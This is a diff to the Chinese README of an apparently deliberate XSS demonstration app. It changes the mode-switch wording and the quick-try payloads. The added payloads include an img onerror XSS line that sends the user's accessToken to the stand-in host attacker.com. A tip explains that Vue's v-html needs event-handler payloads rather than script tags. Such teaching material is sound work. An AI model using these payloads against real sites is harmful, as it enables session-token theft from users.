@@ -49,7 +49,7 @@ docker-compose up -d
 
 ## 模式切换（VULN / SECURE）
 
-- 页面左上角徽章点击切换（推荐）。切换后**认证状态保持不变**，无需重新登录。
+- 页面左上角徽章点击切换（推荐）。切换会自动登出，重新登录即可。
 - 或修改配置并重启：
   - 后端 `apps/backend/src/main/resources/application.yml`: `xss.mode: vuln|secure`
   - 前端 `apps/frontend/.env`: `VITE_XSS_MODE=vuln|secure`
@@ -76,10 +76,12 @@ docker-compose up -d
 详细步骤与对比见：`XSS演示场景说明.md`
 
 ### 快速体验（示例）
-- L0：`/search?q=<script>alert('XSS!')</script>`
-- L1：登录后：`/search?q=<script>console.log(localStorage.getItem('accessToken'))</script>`
+- L0：`/search?q=<img src=x onerror=alert('XSS')>`
+- L1：登录后：`/search?q=<img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))">`
 - L2：访问 `/profile/attacker` 观察伪装登录框
 - L3：提交 `/feedback` 后，用 admin 在 `/admin/feedbacks` 打开详情
+
+💡 **注意**：Vue 中通过 v-html 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 onerror、onload）。
 
 ## 技术栈
 - 前端：Vue 3、Vite、Element Plus、Pinia、Axios
